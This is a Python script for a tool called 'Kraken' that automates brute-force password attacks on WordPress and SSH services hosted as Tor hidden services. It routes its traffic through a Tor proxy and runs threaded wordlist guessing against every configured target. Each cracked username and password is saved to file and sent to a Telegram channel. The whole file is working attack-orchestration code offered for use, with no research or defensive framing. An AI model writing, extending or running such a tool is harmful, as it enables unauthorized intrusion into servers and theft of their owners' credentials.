#!/usr/bin/env python3
"""
Kraken Automated Runner for Hidden Services
Runs brute-force attacks on configured hidden services automatically
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from telegram_reporter import TelegramReporter

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kraken_auto.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class KrakenAuto:
    """Automated Kraken runner for hidden services"""
    
    def __init__(self, config_path="config.json", targets_path="hidden_services.json"):
        """Initialize the automated runner"""
        self.config = self._load_json(config_path)
        self.targets = self._load_json(targets_path)
        self.reports_dir = self.config.get("settings", {}).get("reports_dir", "reports")
        self.telegram = TelegramReporter(config_path)
        
        # Create reports directory
        os.makedirs(self.reports_dir, exist_ok=True)
        
        # Setup Tor proxy if enabled
        self.proxies = {}
        if self.config.get("tor", {}).get("enabled", False):
            proxy_url = self.config.get("tor", {}).get("socks_proxy", "socks5h://127.0.0.1:9050")
            self.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            logging.info(f"Tor proxy enabled: {proxy_url}")
    
    def _load_json(self, filepath):
        """Load JSON configuration file"""
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            logging.error(f"Config file not found: {filepath}")
            return {}
        except json.JSONDecodeError as e:
            logging.error(f"Invalid JSON in {filepath}: {e}")
            return {}
    
    def _save_result(self, service_name, result_data):
        """Save result to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{service_name}_{timestamp}.json"
        filepath = os.path.join(self.reports_dir, filename)
        
        try:
            with open(filepath, 'w') as f:
                json.dump(result_data, indent=2, fp=f)
            logging.info(f"Result saved to: {filepath}")
            return filepath
        except Exception as e:
            logging.error(f"Failed to save result: {e}")
            return None
    
    def _run_wordpress_attack(self, target):
        """Run WordPress brute force attack on hidden service"""
        from files.wordpress_bruteforce_auto import WordPressBruteForceAuto
        
        logging.info(f"Starting WordPress attack on {target['name']}")
        self.telegram.report_scan_start(target['name'], target['url'])
        
        try:
            wp_brute = WordPressBruteForceAuto(
                target=target['url'],
                username_file=target['wordlists']['users'],
                password_file=target['wordlists']['passwords'],
                threads=self.config.get("settings", {}).get("threads", 10),
                timeout=self.config.get("settings", {}).get("timeout", 30),
                proxies=self.proxies
            )
            
            results = wp_brute.run()
            
            # Save and report results
            if results:
                for result in results:
                    self._save_result(target['name'], result)
                    self.telegram.report_success(
                        service_name=target['name'],
                        service_url=target['url'],
                        username=result['username'],
                        password=result['password'],
                        additional_info={"type": "WordPress"}
                    )
                
                self.telegram.report_scan_complete(target['name'], len(results))
                logging.info(f"Found {len(results)} credential(s) for {target['name']}")
            else:
                logging.info(f"No credentials found for {target['name']}")
                self.telegram.report_scan_complete(target['name'], 0)
            
            return results
            
        except Exception as e:
            logging.error(f"Error during WordPress attack: {e}")
            self.telegram.report_error(target['name'], str(e))
            return []
    
    def _run_ssh_attack(self, target):
        """Run SSH brute force attack on hidden service"""
        from files.ssh_bruteforce_auto import SSHBruteForceAuto
        
        logging.info(f"Starting SSH attack on {target['name']}")
        self.telegram.report_scan_start(target['name'], target['url'])
        
        try:
            # Extract host from URL
            host = target['url'].replace('http://', '').replace('https://', '').split(':')[0]
            port = target.get('port', 22)
            
            ssh_brute = SSHBruteForceAuto(
                host=host,
                port=port,
                username_file=target['wordlists']['users'],
                password_file=target['wordlists']['passwords'],
                threads=self.config.get("settings", {}).get("threads", 10),
                timeout=self.config.get("settings", {}).get("timeout", 30),
                proxies=self.proxies
            )
            
            results = ssh_brute.run()
            
            # Save and report results
            if results:
                for result in results:
                    self._save_result(target['name'], result)
                    self.telegram.report_success(
                        service_name=target['name'],
                        service_url=target['url'],
                        username=result['username'],
                        password=result['password'],
                        additional_info={"type": "SSH", "port": port}
                    )
                
                self.telegram.report_scan_complete(target['name'], len(results))
                logging.info(f"Found {len(results)} credential(s) for {target['name']}")
            else:
                logging.info(f"No credentials found for {target['name']}")
                self.telegram.report_scan_complete(target['name'], 0)
            
            return results
            
        except Exception as e:
            logging.error(f"Error during SSH attack: {e}")
            self.telegram.report_error(target['name'], str(e))
            return []
    
    def run(self):
        """Run attacks on all configured hidden services"""
        logging.info("Starting Kraken Automated Runner")
        
        hidden_services = self.targets.get("hidden_services", [])
        
        if not hidden_services:
            logging.warning("No hidden services configured")
            return
        
        for target in hidden_services:
            if not target.get("enabled", True):
                logging.info(f"Skipping disabled target: {target.get('name', 'unknown')}")
                continue
            
            service_type = target.get("type", "").lower()
            
            try:
                if service_type == "wordpress":
                    self._run_wordpress_attack(target)
                elif service_type == "ssh":
                    self._run_ssh_attack(target)
                else:
                    logging.warning(f"Unsupported service type: {service_type} for {target.get('name')}")
                
                # Small delay between targets
                time.sleep(2)
                
            except Exception as e:
                logging.error(f"Error processing target {target.get('name')}: {e}")
                continue
        
        logging.info("Kraken Automated Runner completed")

def main():
    """Main entry point"""
    try:
        runner = KrakenAuto()
        runner.run()
    except KeyboardInterrupt:
        logging.info("Interrupted by user")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
